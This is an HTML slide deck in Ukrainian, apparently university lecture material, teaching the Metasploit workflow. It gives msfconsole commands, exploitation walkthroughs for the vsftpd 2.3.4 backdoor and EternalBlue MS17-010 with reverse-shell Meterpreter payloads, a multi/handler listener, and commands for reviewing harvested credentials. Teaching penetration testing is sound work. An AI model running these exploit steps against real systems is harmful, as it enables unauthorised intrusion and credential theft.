@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 5.6 — Практичний workflow Metasploit</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="5">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Практичний workflow Metasploit</h1>
+      <div class="subtitle">Тема 5.6 — Фреймворк Metasploit та експлуатація</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Основні команди msfconsole -->
+    <section class="slide">
+      <h2>Основні команди msfconsole</h2>
+      <div class="code-block">
+        <span class="code-comment"># Навігація та інформація</span><br>
+        <code><span class="code-keyword">search</span> <span class="code-string">vsftpd</span></code><br>
+        <code><span class="code-keyword">use</span> exploit/unix/ftp/vsftpd_234_backdoor</code><br>
+        <code><span class="code-keyword">back</span>                  <span class="code-comment"># вийти з модуля</span></code><br>
+        <code><span class="code-keyword">info</span>                  <span class="code-comment"># детальна інформація про модуль</span></code><br>
+        <code><span class="code-keyword">show</span> options          <span class="code-comment"># параметри модуля</span></code><br>
+        <code><span class="code-keyword">show</span> payloads         <span class="code-comment"># доступні payload</span></code><br>
+        <code><span class="code-keyword">show</span> targets          <span class="code-comment"># підтримувані цілі</span></code><br>
+        <code><span class="code-keyword">show</span> advanced         <span class="code-comment"># додаткові параметри</span></code><br><br>
+
+        <span class="code-comment"># Конфігурація</span><br>
+        <code><span class="code-keyword">set</span> RHOSTS 192.168.1.10</code><br>
+        <code><span class="code-keyword">set</span> PAYLOAD cmd/unix/interact</code><br>
+        <code><span class="code-keyword">set</span> LHOST 192.168.1.5</code><br>
+        <code><span class="code-keyword">set</span> LPORT 4444</code><br>
+        <code><span class="code-keyword">setg</span> RHOSTS 10.0.0.0/24  <span class="code-comment"># глобальне значення</span></code><br>
+        <code><span class="code-keyword">unset</span> PAYLOAD</code><br><br>
+
+        <span class="code-comment"># Виконання</span><br>
+        <code><span class="code-keyword">run</span>                   <span class="code-comment"># або exploit</span></code><br>
+        <code><span class="code-keyword">exploit</span> -j            <span class="code-comment"># у фоні</span></code><br>
+        <code><span class="code-keyword">sessions</span> -l           <span class="code-comment"># список активних сесій</span></code><br>
+        <code><span class="code-keyword">sessions</span> -i 1         <span class="code-comment"># підключитись до сесії</span></code><br><br>
+
+        <span class="code-comment"># База даних</span><br>
+        <code><span class="code-keyword">db_status</span>             <span class="code-comment"># стан БД</span></code><br>
+        <code><span class="code-keyword">workspace</span> pentest_jan  <span class="code-comment"># створити/переключити workspace</span></code><br>
+        <code><span class="code-keyword">db_nmap</span> -sV 10.0.0.0/24  <span class="code-comment"># зберегти результати в БД</span></code><br>
+        <code><span class="code-keyword">hosts</span>                 <span class="code-comment"># виявлені хости</span></code><br>
+        <code><span class="code-keyword">services</span>              <span class="code-comment"># виявлені сервіси</span></code><br>
+        <code><span class="code-keyword">vulns</span>                 <span class="code-comment"># вразливості</span></code><br>
+        <code><span class="code-keyword">creds</span>                 <span class="code-comment"># отримані облікові дані</span></code><br><br>
+
+        <span class="code-comment"># Інше</span><br>
+        <code><span class="code-keyword">jobs</span>                  <span class="code-comment"># активні фонові завдання</span></code><br>
+        <code><span class="code-keyword">kill</span> 1                <span class="code-comment"># зупинити job</span></code><br>
+        <code><span class="code-keyword">spool</span> /tmp/msf.log    <span class="code-comment"># логування</span></code><br>
+        <code><span class="code-keyword">makerc</span> /tmp/commands.rc  <span class="code-comment"># зберегти історію команд</span></code>
+      </div>
+    </section>
+
+    <!-- Slide 3: Повний workflow -->
+    <section class="slide">
+      <h2>Повний workflow</h2>
+      <div class="info-box">
+        <strong>Стандартний цикл роботи:</strong> сканування → пошук експлойта → налаштування → експлуатація → робота з сесією
+      </div>
+      <div class="flow-row">
+        <div class="flow-step">db_nmap scan</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">search exploit</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">use module</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">show options</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">set params</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">exploit</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">session</div>
+      </div>
+      <div class="two-column">
+        <div class="column">
+          <div class="card-blue">
+            <h3>Приклад 1: vsftpd 2.3.4 backdoor</h3>
+            <div class="code-block">
+              <code>msfconsole</code><br>
+              <code>db_nmap -sV 192.168.1.10</code><br>
+              <code>search vsftpd</code><br>
+              <code>use exploit/unix/ftp/vsftpd_234_backdoor</code><br>
+              <code>show options</code><br>
+              <code>set RHOSTS 192.168.1.10</code><br>
+              <code>exploit</code><br>
+              <code><span class="code-comment"># отримуємо root shell на порту 6200</span></code><br>
+              <code>whoami</code><br>
+              <code>uname -a</code>
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-green">
+            <h3>Приклад 2: EternalBlue MS17-010</h3>
+            <div class="code-block">
+              <code>search ms17-010</code><br>
+              <code>use exploit/windows/smb/ms17_010_eternalblue</code><br>
+              <code>show options</code><br>
+              <code>set RHOSTS 10.10.10.40</code><br>
+              <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code><br>
+              <code>set LHOST 10.10.14.5</code><br>
+              <code>set LPORT 4444</code><br>
+              <code>exploit</code><br>
+              <code><span class="code-comment"># отримуємо Meterpreter сесію</span></code><br>
+              <code>getuid</code><br>
+              <code>sysinfo</code>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: Робота з сесіями -->
+    <section class="slide">
+      <h2>Робота з сесіями</h2>
+      <div class="info-box">
+        <strong>Сесія</strong> — активне підключення до скомпрометованої системи. MSF підтримує паралельну роботу з багатьма сесіями.
+      </div>
+      <div class="code-block">
+        <code>sessions -l          <span class="code-comment"># список активних сесій</span></code><br>
+        <code>sessions -i 1        <span class="code-comment"># підключитись до сесії 1</span></code><br>
+        <code>sessions -u 1        <span class="code-comment"># оновити shell до meterpreter</span></code><br>
+        <code>sessions -K          <span class="code-comment"># закрити всі сесії</span></code><br>
+        <code>background           <span class="code-comment"># відправити сесію у фон (Ctrl+Z)</span></code>
+      </div>
+      <div class="card-purple" style="margin-top: 20px;">
+        <h3>multi/handler — ловіння reverse shells</h3>
+        <div class="code-block">
+          <code><span class="code-comment"># Налаштування listener для прийому зворотних підключень</span></code><br>
+          <code>use exploit/multi/handler</code><br>
+          <code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br>
+          <code>set LHOST 10.0.0.1</code><br>
+          <code>set LPORT 4444</code><br>
+          <code>exploit -j           <span class="code-comment"># запустити у фоні</span></code><br><br>
+          <code><span class="code-comment"># Після отримання підключення:</span></code><br>
+          <code>sessions -l</code><br>
+          <code>sessions -i 1</code>
+        </div>
+        <p><span class="highlight">multi/handler</span> використовується для прийому зворотних підключень від payload, згенерованих msfvenom або інших джерел.</p>
+      </div>
+    </section>
+
+    <!-- Slide 5: База даних та workspace -->
+    <section class="slide">
+      <h2>База даних та workspace</h2>
+      <div class="code-block">
+        <code><span class="code-comment"># Перевірка стану БД</span></code><br>
+        <code>db_status</code><br><br>
+
+        <code><span class="code-comment"># Управління workspace (для ізоляції проєктів)</span></code><br>
+        <code>workspace                  <span class="code-comment"># список workspace</span></code><br>
+        <code>workspace -a pentest_2026  <span class="code-comment"># створити новий</span></code><br>
+        <code>workspace pentest_2026     <span class="code-comment"># переключитись</span></code><br>
+        <code>workspace -d old_project   <span class="code-comment"># видалити</span></code><br><br>
+
+        <code><span class="code-comment"># Сканування із збереженням у БД</span></code><br>
+        <code>db_nmap -sV -sC 10.0.0.0/24</code><br>
+        <code>db_nmap -p- --open 192.168.1.0/24</code><br><br>
+
+        <code><span class="code-comment"># Перегляд зібраних даних</span></code><br>
+        <code>hosts                      <span class="code-comment"># виявлені хости</span></code><br>
+        <code>hosts -c address,os_name   <span class="code-comment"># конкретні колонки</span></code><br>
+        <code>services                   <span class="code-comment"># виявлені сервіси</span></code><br>
+        <code>services -p 445            <span class="code-comment"># фільтр за портом</span></code><br>
+        <code>vulns                      <span class="code-comment"># виявлені вразливості</span></code><br>
+        <code>creds                      <span class="code-comment"># отримані паролі та хеші</span></code><br><br>
+
+        <code><span class="code-comment"># Експорт даних</span></code><br>
+        <code>db_export -f xml /tmp/results.xml</code>
+      </div>
+      <div class="success-box" style="margin-top: 20px;">
+        <strong>Поради:</strong><br>
+        • Використовуйте окремі workspace для різних проєктів<br>
+        • db_nmap автоматично парсить результати та зберігає в БД<br>
+        • Команда <span class="highlight">hosts -R</span> встановлює RHOSTS для всіх виявлених хостів<br>
+        • Регулярно експортуйте дані для звітності
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
